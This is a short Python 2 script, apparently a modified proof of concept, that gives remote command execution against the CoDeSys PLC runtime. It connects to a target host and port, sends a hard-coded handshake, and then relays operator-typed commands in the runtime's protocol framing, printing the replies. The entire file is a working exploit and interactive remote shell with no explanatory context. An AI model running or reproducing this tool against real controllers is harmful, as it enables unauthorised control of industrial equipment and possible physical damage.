import sys
import struct
import socket

# code for codesys rce
#modify by hellok 3/2013

# Takes integer, returns endian-word
def little_word(val):
    packed = struct.pack('<h', val)
    return packed

def big_word(val):
    packed = struct.pack('>h', val)
    return packed

def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send("\xbb\xbb\x00\x00\x00\x09\x42\x7d\x49\xb6\x18\x00\x00\x5d\x28")
    try:
        data = s.recv(1024)
        #print "Debug: connected!"
    except:
        print "Debug: connection failed...:("
        exit(1)
    return s

def send_cmd(s, cmd):
    wrapcmd = "\x92\x00\x00\x00\x00" + cmd + "\x00"
    cmdlen = len(wrapcmd)
 #   data = "\xcc\xcc\x01\x00" + little_word(cmdlen) + ("\x00"*10) + "\x01" + "\x00" * 3 + "\x23" + little_word(cmdlen) + "\x00" + wrapcmd
#    data = "\xcc\xcc\x01" + big_word(cmdlen+1+4) + ("\x00"*11) + "\x01" + "\x00" * 3 + "\x23" + little_word(cmdlen) + "\x00" + wrapcmd
    packed = struct.pack('<h', cmdlen)
    data = "\xbb\xbb\x00\x00\x00"+packed
    len1=len(data)
    len1=len1-1
    data = data[:len1]
    data+=wrapcmd
    s.send(data)
    responsefinished = False
    respdata = ""
    acknum=1
    while responsefinished != True:
        try:
            receive = s.recv(1024)
            if len(receive) < 30:
                continue
            # If it is 0x04, then we received the last response packet to our request
            # Technically we shouldn't add this most recently received data to our payload,
            # Since it's equivalent to a dataless FIN
            if receive[9] == "\x04":#27
                responsefinished = True
                # Note that *sometimes* we have data in a 0x04 response packet!
                # continue
            # This is a hack, as with recv_file2 in the codesys-file transfer stuff
            #respdata += receive[30:] + "\n"
            print receive[13:]#31
            #print "Debug: Received response! -> ",  receive
            # Acknowledge and request more data
            # Acknowledgement requires that we say which response packet we received,
            # Response packet number is at offset 28...it's really a little word, but I'm treating
            # it as a byte foolishly :).
            # First part of acknowledge is sidechannel comms using fc 6666
           # ack1 = "\x66\x66\x01" + "\x00" * 13 + "\x01\x00\x00\x00\x06\x00\x00\x00"
           # s.send(ack1)
           # garbage = s.recv(1024)
            # the second part of acknowledge says we received the last cccc frame and we're ready for another
            # This hack doesn't work for big commands like dpt, ppt which have more than 256 responses!
           # acknum = struct.unpack('<h', receive[29:31])[0]
            #print "Debug: Sending acknowledge ", acknum
            ack2 = "\xbb\xbb\x00\x00\x00\x06\x92\x01\x00"  + little_word(acknum) + "\x00"
            acknum+=1
            s.send(ack2)

        except:
            print "Debug: timeout"
            break
    # Now that we've received all output blocks, we want to say that we're done with the command
    ack1 = "\x66\x66\x01" + "\x00" * 13 + "\x01\x00\x00\x00\x06\x00\x00\x00"
    s.send(ack1)
    garbage = s.recv(1024)
    print respdata
    return
 
    
if len(sys.argv) < 3:
    print "Usage: ", sys.argv[0], " <host> <port>"
    exit(1)

while True:
    print "> ", 
    #try:
    s = connect(sys.argv[1], int(sys.argv[2]))
    myinput = raw_input()
    send_cmd(s, myinput)
    s.close()
    #except:
     #   print "Debug: Caught signal, exiting..."
      #  exit(0)
    
